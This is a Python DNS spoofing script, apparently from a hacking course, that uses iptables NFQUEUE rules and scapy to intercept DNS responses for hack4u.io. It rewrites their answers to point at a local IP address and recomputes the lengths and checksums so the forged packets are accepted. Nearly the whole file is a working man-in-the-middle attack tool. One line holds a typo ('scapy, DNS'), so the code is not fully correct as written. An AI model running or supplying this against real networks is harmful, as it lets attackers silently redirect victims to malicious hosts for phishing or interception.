#!/usr/bin/env python3

"""
# DNS spoofing settings

> iptables -I INPUT -j NFQUEUE --queue-num 0
> iptables -I OUTPUT -j NFQUEUE --queue-num 0
> iptables -I FORWARD -j NFQUEUE --queue-num 0
> iptables --policy FORWARD ACCEPT

Required install 
sudo pacman -Syu
sudo pacman -S base-devel
sudo pacman -S libnetfilter_queue
sudo pacman -S netfilterqueue

"""

import signal
import subprocess
import sys

import netfilterqueue
import scapy.all as scapy
from termcolor import colored


def def_handler(sig, frame):
    print(colored("[!] Saliendo...\n\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    # HACK: interpretando el paquete con scapy
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet)

    # NOTE: Filtrando por dnsname

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"hack4u.io" in qname:
            print(f"\n[+] Envenenando el dominio hack4u.io\n")
            print(packet.show())
            # NOTE: Construyendo el paquete a enviar
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.100.54")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy, DNS].ancount = 1

            # HACK: Si eliminamos de la capa IP el len y el chksum saltamos la validacion de la intergridad del paquete
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # NOTE: Construye el paquete nuevamente
            print(scapy_packet.build())
            packet.set_payload(scapy_packet.build())

    # NOTE: Acepta el paquete
    packet.accept()


def main():

    print(colored("[+] configurando iptables y queue en 0\n\n", "green"))
    subprocess.run(
        ["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"],
    )
    subprocess.run(
        ["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"],
    )
    subprocess.run(
        ["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"],
    )
    subprocess.run(["iptables", "--policy", "FORWARD", "ACCEPT"])

    queue = netfilterqueue.NetfilterQueue()

    # NOTE: numero de query en 0 por iptables -I INPUT -j NFQUEUE --queue-num 0
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
